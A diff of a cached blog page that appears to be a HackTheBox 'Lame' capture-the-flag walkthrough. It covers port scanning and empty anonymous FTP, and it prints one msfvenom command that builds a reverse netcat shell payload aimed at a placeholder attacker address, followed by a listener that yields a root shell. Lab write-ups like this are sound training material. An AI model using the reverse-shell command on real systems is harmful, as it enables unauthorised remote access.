@@ -1,4 +1,4 @@
-I"?<h1 id="introductionlame">Introduction@Lame:~$</h1>
+I"E<h1 id="introductionlame">Introduction@Lame:~$</h1>
 
 <table>
   <thead>
@@ -57,11 +57,13 @@
 <p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
 
 <hr />
+
 <p><img src="/assets/img/lame-hackthebox/nmap-scan-1.png" alt="" /></p>
 
 <p>From a <code class="language-plaintext highlighter-rouge">quick scan</code> we know that <code class="language-plaintext highlighter-rouge">4 Ports</code> are open i.e. <code class="language-plaintext highlighter-rouge">21,22,139,445</code>. Let’s access port 21 <code class="language-plaintext highlighter-rouge">ftp</code> for anonymous logins.</p>
 
 <hr />
+
 <p><img src="/assets/img/lame-hackthebox/ftp-login-2.png" alt="" /></p>
 
 <p>But it’s of no use as the directories are <code class="language-plaintext highlighter-rouge">empty</code>.</p>
@@ -73,16 +75,19 @@
 <p><strong>msfvenom command</strong> : <em>msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.X.X LPORT=9999 -f python</em></p>
 
 <hr />
+
 <p><img src="/assets/img/lame-hackthebox/changing the payload-4.png" alt="" /></p>
 
-<p>This is what the final exploit looks like: (<em>chaning the payload with our payload</em>)</p>
+<p>This is what the final exploit looks like: (<em>changing the payload with our payload</em>)</p>
 
 <hr />
+
 <p><img src="/assets/img/lame-hackthebox/my-final-exploit-6.png" alt="" /></p>
 
 <p>Running the exploit and listeing on specified port using <code class="language-plaintext highlighter-rouge">nc</code>, we got the <code class="language-plaintext highlighter-rouge">Root shell</code>.</p>
 
 <hr />
+
 <p><img src="/assets/img/lame-hackthebox/got-root-shell-7.png" alt="" /></p>
 
 :ET
